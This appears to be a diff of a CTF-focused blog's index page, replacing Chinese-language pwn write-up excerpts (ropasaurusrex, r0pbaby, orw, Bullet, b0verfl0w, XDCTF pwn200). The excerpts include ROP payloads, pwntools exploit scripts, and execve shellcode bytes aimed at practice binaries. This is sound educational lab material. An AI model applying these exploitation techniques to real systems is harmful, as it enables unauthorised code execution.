@@ -60,6 +60,9 @@
 					<li>
 						<a href="/about/">About</a>
 					</li>
+					<li>
+						<a href="/index.xml">RSS</a>
+					</li>
 				</ul>
 			</nav>
 		</header>
@@ -76,69 +79,62 @@
 
 <article class="post-entry">
 	<header class="entry-header">
-		<h2>PlaidCTF-2013-ropasaurusrex</h2>
+		<h2>Bullet</h2>
 	</header>
 	<section class="entry-content">
-	 <p>分析：
-buf大小只有0x88,但是却允许被读入0x100的字节大小，造成缓冲区溢出。程序是32位。
-定义函数：ssize_t write (int fd, const void * buf, size_t count);
-函数说明：write()会把参数buf 所指的内存写入count 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动.
-攻击思路：
-1.构造 payload leak 内存中的一个函数地址，比如 read ，write（返回地址是有漏洞的函数，以便第二次利用） 2.计算libc base，得到 system 地址 3.构造payload get shell
-info leak:
-payload：
-&#39;A&#39; * N &#43; p32(write_plt) &#43; p32(ret) &#43; p32(1) &#43; p32(address) &#43; p32(4)
-输入N个字符后发生溢出，write_plt的地址将会覆盖 read 函数的返回地址，随后程序将会跳转到write函数，我们在栈中构造了write函数的3个参数和返回地址，这段payload相当于让程序执行 write(1, address, 4);
-这样就可以dump出内存中地址为address处的4字节数据。 (参考：初探ROP攻击 Memory Leak &amp; DynELF)
-from pwn import *elf = ELF(&#39;./ropasaurusrex&#39;)io = process(&#39;./ropasaurusrex&#39;)libc = ELF(&#39;/lib/i386-linux-gnu/libc....</p>
+	 <p>注意stack或是struct的layout
+漏洞strncat(bullet-&gt;desc,buf,MAX - bullet-&gt;power); 这样首先create长度为47的bullet，通过power_up 再增加一个power 此时bullet长度为48 通过strnact 最后还会赋值 null ,因此造成溢出,power會從\x2f蓋成\x00
+又因为 power = strlen(power) &#43; power 所以最后power为1 杀死gin才会触发return;
+再次powerup的时候,由于len和char间没有\0,strncat会连接到len的后面,从而改写len并rop. 注意payload 中不能有null 由於程式本身有NX保护，必須使用ROP控制程式行為 但許多address因包含null byte，這些address無法被strncat複製到buffer上，因此覆寫main frame的return address時最多只能使用ROP執行某些gadgets。
+再做一次 power_up() 就可以修改掉 power 的值並 overflow 到 main() 的 return address
+最後把 power 改超大殺死 Werewolf 就可以触发 return ，而我们通过溢出修改 return 处的栈帧达到我们的目的 首先要泄露libc 的基址，从而得到system和 bin/sh 的地址，这里借用puts 函数 然后再触发system 函数 所以需要利用两次漏洞，第一次漏洞利用时返回地址应该是 main 。
+内置的ROP怎么用 怎么查看 main的 return address是在overflow之後7個bytes 呢？？？看了半天 使用pattern search 可以算出offset 终于可以写payload了 但是我输入了\xff\xff\xff 为什么就是打不败呢？？
+这是别人的步骤： step1：创建银弹，长度47 step2：补充银弹，长度1 step3：补充银弹，长度47 |\xff * 3| &#43; | junk(四字节)| &#43; | put_addr | &#43; | main_addr | &#43; | got表中存储read的位置| step4：调用beat，打败werewolf step5：函数返回，调用puts，获得read()函数地址，并据此计算出libc基址，以及system、binsh地址等 step6：函数再次执行main，重复step1、step2 step7：补充银弹，长度47 |\xff * 3| &#43; | junk（四字节）| &#43; | system_addr | &#43; |junk（四字节）| &#43; |bin_sh_addr|...</p>
 	</section>
 	<footer class="entry-footer">
-		<time>March 17, 2018</time>
+		<time>March 29, 2018</time>
 	</footer>
-	<a class="entry-link" aria-label="link to PlaidCTF-2013-ropasaurusrex post" href="https://yuuoniy.github.io/posts/plaidctf-2013-ropasaurusrex/"></a>
+	<a class="entry-link" aria-label="link to Bullet post" href="https://yuuoniy.github.io/posts/bullet/"></a>
 </article>
 <article class="post-entry">
 	<header class="entry-header">
-		<h2>Defcon-2015-Qualifier-r0pbaby</h2>
+		<h2>b0verfl0w</h2>
 	</header>
 	<section class="entry-content">
-	 <p>64位需要rdi传参，有PIE保护不能使用程序中的gadget，此处可以从libc中找
-buf的大小是8，会造成缓冲区溢出
-解题思路
-1.找到一个gadget RDI
-2.找到 /bin/sh地址
-3.找到 system 函数地址
-查找 gadget
-ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &#34;pop|ret&#34;
-查找 /bin/sh 字符串
-strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep &#34;/bin/sh&#34;
-from pwn import *elf = ELF(&#39;r0pbaby&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)io = process(&#39;./r0pbaby&#39;)sh = next(libc.search(&#39;/bin/sh&#39;))sys_offset = libc.symbols[&#39;system&#39;]rdi_offset = 0x000000000002144fdef getFun(fun):io.recvuntil(&#34;4) Exit\n:&#34;)io.sendline(&#39;2&#39;)io.recvuntil(&#34;Enter symbol:&#34;)io.sendline(fun)msg = io.recvuntil(&#34;4) Exit\n: &#34;)offset = msg.find(&#34;:&#34;)offset2 = msg.find(&#34;\n&#34;)addr = msg[offset&#43;2:offset2]return long(addr,16)sys_addr = getFun(&#39;system&#39;) sh_addr = sys_addr-sys_offset &#43; sh rdi_addr = sys_addr - sys_offset&#43;rdi_offsetpayload = &#39;a&#39;*8&#43;p64(rdi_addr)&#43;p64(sh_addr)&#43;p64(sys_addr)io....</p>
+	 <p>stack privot 题目 溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。
+基本利用思路如下
+利用栈溢出布置shellcode 控制eip指向shellcode处
+第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。
+ROPgadget --binary b0verfl0w --only &#39;jmp|ret&#39; 
+size(shellcode&#43;padding)=0x20 size(fake ebp)=0x4 size(0x08048504)=0x4 所以我们最后一段需要执行的指令就是
+sub 0x28,espjmp espMemory layout: | Shellcode | Offset | 0x08048504 | Shellcode to perform stack pivoting |
+from pwn import *sh = process(&#39;./b0verfl0w&#39;)shellcode = &#34;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#34;;padding = &#39;a&#39;*13jmp_esp = 0x08048504sub_esp_jmp = asm(&#39;sub esp,0x28;jmp esp&#39;)payload = shellcode&#43;padding&#43;p32(jmp_esp)&#43;sub_esp_jmpsh.sendline(payload)sh.interactive()我不明白既然有了 asm(‘sub esp,0x28;jmp esp’) 为什么还需要直接跳转到esp的gadgets。 解释：我们就可以借由jmp esp将执行流转移到栈上执行。而转移到栈上执行后，我们还需要对esp减上偏移(在返回地址时esp已经和ebp指向同一个地址)，使之转移到我们的buf中继续执行，而buf中我们事先就输入好了shellcode，那么我们在劫持完成后便可以获得一个shell...</p>
 	</section>
 	<footer class="entry-footer">
-		<time>March 17, 2018</time>
+		<time>March 18, 2018</time>
 	</footer>
-	<a class="entry-link" aria-label="link to Defcon-2015-Qualifier-r0pbaby post" href="https://yuuoniy.github.io/posts/defcon-2015-qualifier-r0pbaby/"></a>
+	<a class="entry-link" aria-label="link to b0verfl0w post" href="https://yuuoniy.github.io/posts/b0verfl0w/"></a>
 </article>
 <article class="post-entry">
 	<header class="entry-header">
-		<h2>CTF|pwnable.tw orw writeup</h2>
+		<h2>CTF | XDCTF2015-pwn200(DynELF)</h2>
 	</header>
 	<section class="entry-content">
-	 <p>pwnable.tw orw writeup shellcode的编写
-呀真的好久没有写博客了，最近在做一些题，都在看别人的题解，做过也忘了，接下来希望好好记录一下，帮助自己理解。
-这道题是有关shellcode的编写，这部分我之前也没学习过，都是使用机器生成的。就…结合别人的writeup 说一下自己的理解吧。
-高级语言形式
-char *fn = &#34;/home/orw/flag&#34;; sys_open(fn,0,0) sys_read(3,fn,0x30) sys_write(1,fn,0x30) 查看 linux 系统调用 获得各个函数的调用号
-首先是第一部分 sys_openxor ecx,ecx ;清空ecx寄存器mov eax,0x5;查看以上资料知道 sys_open 对应0x5push ecx ;把一个空值压入栈中(这里不是很理解)push 0x67616c66;galf(flag) 接下来就是把字符串作为参数压入栈中 数字就是字符的ASCII码十六进制值push 0x2f77726f; /wro (orw/)push 0x2f656d6f; /emo (ome/)push 0x682f2f2f; h/// (///h)mov ebx,esp;把内容移到ebxxor edx,edx;清空 edxint 0x80;中断 执行syscall第二部分是sys_readmov eax,0x3;sys_readmov ecx,ebx;flag文件中的内容mov ebx,0x3;文件描述符mov dl,0x30;用于中断(??)int 0x80;中断 执行syscall第三部分是sys_writemov eax,0x4;sys_writemov bl,0x1;用于中断int 0x80最后的脚本：...</p>
+	 <p>该题用到了 DynELF 技术
+DynELF 是 pwntools 中专门用来应对无 libc 情况的漏洞利用模块，其基本代码框架如下。
+p = process(&#39;./xxx&#39;) def leak(address): #各种预处理 payload = &#34;xxxxxxxx&#34; &#43; address &#43; &#34;xxxxxxxx&#34; p.send(payload) #各种处理 data = p.recv(4) return data d = DynELF(leak, elf=ELF(&#34;./xxx&#34;)) #初始化DynELF模块  systemAddress = d.lookup(&#39;system&#39;, &#39;libc&#39;) #在libc文件中搜索system函数的地址 再看 read 函数： 定义函数：ssize_t read(int fd, void * buf, size_t count);  函数说明：read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. 若参数 count 为 0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.
+思路：
+1.调用 main 函数循环利用 2.泄露出 system 地址...</p>
 	</section>
 	<footer class="entry-footer">
-		<time>March 14, 2018</time>
+		<time>March 18, 2018</time>
 	</footer>
-	<a class="entry-link" aria-label="link to CTF|pwnable.tw orw writeup post" href="https://yuuoniy.github.io/posts/pwnable-tw-orw-writeup/"></a>
+	<a class="entry-link" aria-label="link to CTF | XDCTF2015-pwn200(DynELF) post" href="https://yuuoniy.github.io/posts/xdctf2015-pwn200/"></a>
 </article> 
 <footer class="page-footer">
 	<nav class="pagination">
 		<a class="prev" href="/page/9/">← Prev Page</a>
+		<a class="next" href="/page/11/">Next Page →</a>
 	</nav>
 </footer></main>
 <footer class="footer">
